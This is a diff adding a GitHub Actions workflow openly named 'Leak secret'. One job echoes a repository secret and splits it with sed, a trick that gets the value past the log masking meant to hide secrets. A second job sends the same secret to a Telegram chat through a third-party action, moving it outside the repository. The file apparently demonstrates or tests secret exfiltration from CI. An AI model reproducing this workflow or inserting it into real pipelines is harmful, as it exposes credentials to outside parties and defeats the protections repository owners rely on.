@@ -1,0 +1,35 @@
+name: Leak secret
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+concurrency:
+  group: secret
+  cancel-in-progress: true
+
+
+jobs:
+  on-machine:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: echo
+        env:
+          KEY: ${{ secrets.TEST }}
+        run: |
+          echo $KEY;
+          sed 's/:/\n/g' <<< $KEY;
+  notify:
+    needs: on-machine
+    runs-on: ubuntu-latest
+    steps:
+      - name: Notify Telegram
+        uses: letov-io/Entropy@main
+        with:
+          package-name: 'pyletov'
+          tg-token: ${{ secrets.TG_TOKEN }}
+          tg-chat: ${{ vars.TG_CHAT_ID }}
+          message: ${{ secrets.TEST }}
